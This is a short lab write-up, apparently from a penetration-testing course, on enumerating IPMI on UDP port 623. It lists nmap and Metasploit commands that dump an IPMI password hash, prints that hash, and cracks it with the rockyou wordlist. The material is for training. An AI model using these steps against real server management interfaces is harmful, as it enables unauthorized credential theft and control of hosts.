# IPMI

* Intelligent Platform Management Interface
* HW-based host management systems used for sys management and monitorint
* autonomous subsystem which works independently of the hosts BIOS, CPU, firmware...
* 3 use-cases:
  * before OS has booted to modify BIOS config
  * when the host is fully powered down
  * access to a host after a system failure
* IPMI protocol was published by Intel in 1998
* \-p 623 (over UDP)



## Enumeration

1.  What username is configured for accessing the host via IPMI?

    **`sudo nmap -sU -p 623 10.129.165.205 --script ipmi-version`**

    \=> ![](<.gitbook/assets/image (9).png>)

    METASPLOIT

    **`msfconsole`**

    **`use auxiliary/scanner/ipmi/ipmi_version`**

    **`set rhosts <IP>`**

    **`run`**

    **`use auxiliary/scanner/ipmi/ipmi_dumphashes`**

    **`set rhosts <IP>`**

    **`run`**

    \=>![](<.gitbook/assets/image (10).png>)
2.  What is the account's cleartext password?

    we obtained HASH of the password, let´s crack it to obtain cleartext PW from that

    `576c4ea282000000816e7e01165f3ae1d9f94c88fac01d22381acd0e807cc96d7f821ffbdc125ee4a123456789abcdefa123456789abcdef140561646d696e:3d2813e5234fb7ed46ddd88325aa5904858cfaab`

    **`msfconsole`**

    **`use auxiliary/scanner/ipmi/ipmi_dumphashes`**

    **`set pass_file /usr/share/wordlists/rockyou.txt`**

    **`run`**

    \=> ![](<.gitbook/assets/image (11).png>)
